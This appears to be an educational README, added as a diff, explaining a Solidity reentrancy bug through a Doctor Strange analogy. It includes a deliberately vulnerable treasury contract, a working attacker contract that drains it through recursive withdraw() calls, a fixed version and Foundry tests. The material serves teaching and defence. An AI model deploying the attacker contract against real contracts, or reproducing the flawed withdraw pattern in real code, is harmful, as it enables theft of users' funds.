@@ -1,0 +1,308 @@
+# 🌀 Doctor Strange vs Dormammu — Reentrancy Exploit Case Study
+
+## TL;DR
+
+* **Vulnerability:** Reentrancy in `withdraw()` (external call before state update).
+* **Impact:** An attacker (Doctor Strange, via the Time Stone)  can reenter via fallback and drain the **Dormammu Treasury**.
+* **Severity:** High
+* **Fix:** Apply CEI (update state before external calls) and use a reentrancy guard.
+
+---
+
+## 🎬 MCU Story 
+
+In *Doctor Strange (2016)*, Strange traps Dormammu in an infinite **time loop**. Just like Strange looping Dormammu until surrender, the `receive()` loop forces the treasury into repeated withdrawals until drained.
+
+In smart contract security:
+
+* **Dormammu** = “timeless treasury” → vulnerable to reentrancy (powerful but careless).
+* **Doctor Strange** = doesn’t attack directly → he uses the Time Stone.
+* **Time Stone (contract)** = has the receive() fallback and does the recursive withdraw() calls (the infinite loop).
+
+This mirrors the movie: Strange wins not by force, but by infinite repetition — just like a reentrancy attack.
+
+---
+
+## Roles
+
+* **DormammuTreasuryVulnerable** → the treasury (victim). [full code->](#)
+* **TimeStone** → the attack contract (the magical exploit engine).[full code->](#)
+* **DoctorStrange (EOA / test)** → just a caller who wields the TimeStone.
+
+## 📌 Vulnerable Contract
+
+Here’s the **flawed** `DormammuTreasuryVulnerable.sol`:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+/*
+  Dormammu (the treasury) holds Ether for citizens and pays a reward on withdraw.
+  Bug: withdraw() sends Ether before updating the user's balance (CEI violation).
+  An attacker (Doctor Strange) can reenter withdraw() in their fallback and drain the contract.
+*/
+
+contract DormammuTreasuryVulnerable {
+    mapping(address => uint256) public balanceOf;
+
+    /// @notice Alien Citizens deposit to the Dormammu Treasury
+    function deposit() external payable {
+        require(msg.value > 0, "zero deposit");
+        balanceOf[msg.sender] += msg.value;
+    }
+
+    /// @notice Withdraw available balance (vulnerable)
+    function withdraw() external {
+        uint256 amount = balanceOf[msg.sender];
+        require(amount > 0, "no balance");
+
+        //  Vulnerable: external call happens BEFORE state update
+        (bool sent,) = payable(msg.sender).call{value: amount}("");
+        require(sent, "send failed");
+
+        // state update happens after the external call — attacker can reenter here
+        balanceOf[msg.sender] = 0;
+    }
+
+    /// @notice Current treasury balance
+    function treasuryBalance() external view returns (uint256) {
+        return address(this).balance;
+    }
+}
+```
+
+**Problem:** External call happens **before** state reset. If the recipient is a contract with a `receive()` or `fallback()`, it can call `withdraw()` again before its balance is cleared.
+
+---
+
+##  Proof of Exploit
+
+Attacker = **TimeStone.sol**:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+import {DormammuTreasuryVulnerable} from "../../src/Reentrancy-CEI/DormammuTreasuryVulnerable.sol";
+
+/// @title Doctor Strange attacker (reentrancy) & Attacker + test harness using TimeStone.
+contract TimeStone {
+    DormammuTreasuryVulnerable public treasury;
+    address public owner;
+    uint256 public rewardAmount;
+
+    constructor(address _vuln) {
+        treasury = DormammuTreasuryVulnerable(_vuln);
+        owner = msg.sender;
+    }
+
+    /// @notice deposit and start the attack
+    function attack() external payable {
+        require(msg.sender == owner, "You're not a Doctor Strange");
+        require(msg.value > 0, "send ETH to attack");
+        // deposit small amount to be eligible for withdraw
+        treasury.deposit{value: msg.value}();
+        // set single-call baseline reward to attempt
+        rewardAmount = msg.value;
+        treasury.withdraw();
+    }
+
+    /// @notice fallback — reenter while the treasury still has funds
+    receive() external payable {
+        // while the treasury still has at least `rewardAmount`, reenter withdraw()
+        // careful: this condition keeps reentering until the treasury is drained or < rewardAmount
+        if (address(treasury).balance >= rewardAmount) {
+            treasury.withdraw();
+        }
+    }
+
+    /// @notice collect stolen funds to owner externally (for test reporting)
+    function collect() external {
+        require(msg.sender == owner, "You're not a Doctor Strange");
+        payable(owner).transfer(address(this).balance);
+    }
+}
+```
+
+**Exploit Flow:**
+
+1. Strange deposits 1 ETH into Dormammu’s treasury.
+2. Calls `withdraw()`.
+3. During `.call`, his `receive()` reenters `withdraw()`.
+4. Treasury hasn’t reset balance → pays again.
+5. Loop continues until Dormammu is empty.
+
+---
+
+##  Fixed Contract
+
+`DormammuTreasuryFixed.sol`:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
+
+contract DormammuTreasuryFixed is ReentrancyGuard {
+    mapping(address => uint256) public balanceOf;
+
+    function deposit() external payable {
+        require(msg.value > 0, "zero deposit");
+        balanceOf[msg.sender] += msg.value;
+    }
+
+    function withdraw() external nonReentrant {
+        uint256 amount = balanceOf[msg.sender];
+        require(amount > 0, "no balance");
+
+        //  Effects first
+        balanceOf[msg.sender] = 0;
+
+        //  Then interaction
+        (bool sent, ) = payable(msg.sender).call{value: amount}("");
+        require(sent, "send failed");
+    }
+
+    function treasuryBalance() external view returns (uint256) {
+        return address(this).balance;
+    }
+}
+```
+
+**Fixes applied:**
+
+* CEI (update balance before transfer).
+* `nonReentrant` modifier for extra guard.
+
+---
+
+##  Foundry Test (Exploit Reproduction)
+
+`test/ExploitDormammu.t.sol`:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+import {Test} from "forge-std/Test.sol";
+import {DormammuTreasuryVulnerable} from "../../src/Reentrancy-CEI/DormammuTreasuryVulnerable.sol";
+import {DormammuTreasuryFixed} from "../../src/Reentrancy-CEI/DormammuTreasuryFixed.sol";
+import {TimeStone} from "../../src/Reentrancy-CEI/TimeStone.sol";
+
+contract ReentrancyDormammuTest is Test {
+    DormammuTreasuryVulnerable treasury;
+    DormammuTreasuryFixed fixedTreasury;
+    TimeStone stone;
+    TimeStone timeStoneFixed;
+
+    address public Doctor_Strange = makeAddr("Doctor Strange");
+
+    function setUp() public {
+        // Deploy vulnerable and fixed contracts
+        treasury = new DormammuTreasuryVulnerable();
+        fixedTreasury = new DormammuTreasuryFixed();
+
+        // Fund the Dormammu treasury (other citizens)
+        vm.deal(address(this), 50 ether);
+        // send 20 ETH to vulnerable treasury as "Alien citizen deposits"
+        treasury.deposit{value: 20 ether}();
+        fixedTreasury.deposit{value: 20 ether}();
+
+        // deploy stone and fund it
+        vm.prank(Doctor_Strange);
+        stone = new TimeStone(address(treasury));
+        vm.deal(address(Doctor_Strange), 5 ether);
+
+        vm.prank(Doctor_Strange);
+        timeStoneFixed = new TimeStone(address(fixedTreasury));
+    }
+
+    function test_Strange_Drains_Dormammu_With_TimeStone() public {
+        // Check initial balances
+        uint256 initialTreasury = address(treasury).balance;
+        assertEq(initialTreasury, 20 ether);
+
+        // Doctor Strange: Doctor Strange deposits 1 ETH and triggers reentrancy withdraw
+        vm.prank(Doctor_Strange);
+        stone.attack{value: 1 ether}();
+
+        // After attack collect to track funds in This Contract (optional)
+        vm.prank(Doctor_Strange);
+        stone.collect();
+
+        // Doctor Strange (via Time Stone) gains more than his initial 1 ETH
+        // Dormammu Treasury should NOT have its full 20 ETH anymore
+        uint256 remainingTreasury = address(treasury).balance;
+        assertLt(remainingTreasury, 20 ether, "Dormammu Treasury should have lost funds due to reentrancy");
+    }
+
+    /// @notice Minimal test reusing vulnerable pattern but targeting fixed contract type
+    function test_Fixed_Resists_Reentrancy() public {
+        // Check initial balances
+        uint256 initialTreasury = address(fixedTreasury).balance;
+        assertEq(initialTreasury, 20 ether);
+
+        // Doctor Strange tries to attack fixed treasury
+        vm.prank(Doctor_Strange);
+        vm.expectRevert(); // we EXPECT this to fail
+        timeStoneFixed.attack{value: 1 ether}();
+
+        // Verify treasury still holds full funds
+        uint256 remainingfixedTreasury = address(fixedTreasury).balance;
+        assertEq(remainingfixedTreasury, 20 ether, "Fixed treasury should resist reentrancy and keep full funds");
+    }
+}
+```
+In `test_Fixed_Resists_Reentrancy()`, note : why we expect revert:
+Because `nonReentrant` blocks recursive calls, the attack transaction itself reverts.
+
+---
+
+##  Auditor’s Checklist
+
+* [ ] External calls before state updates.
+* [ ] Missing `nonReentrant`.
+* [ ] Loops with external calls.
+* [ ] No attacker simulation in tests.
+
+---
+
+##  Recommendations
+
+* Always apply **Checks → Effects → Interactions**.
+* Use `nonReentrant` modifiers.
+* Consider **pull-payment patterns**.
+* Test with attacker contracts in CI pipelines.
+
+---
+
+## References & Inspiration
+
+* MCU: *Doctor Strange (2016)* → loop analogy.
+* Historical hacks: DAO (2016), Fei Protocol (2021).
+* OpenZeppelin’s [ReentrancyGuard](https://docs.openzeppelin.com/contracts/5.x/api/utils#ReentrancyGuard).
+
+---
+
+## How to Run Locally
+
+```bash
+# install Foundry
+curl -L https://foundry.paradigm.xyz | bash
+foundryup
+
+# clone repo & test
+forge test -vv
+```
+
+---
+
+##  Final Note
+
+This repo is an **educational minimal reproduction** of reentrancy. The MCU analogy (Doctor Strange looping Dormammu) makes the bug memorable, but the exploit reflects **real-world \$150M+ hacks**.
+
+📂 Full repo: [`audit-kit/reentrancy-dormammu`](#)
+
+---
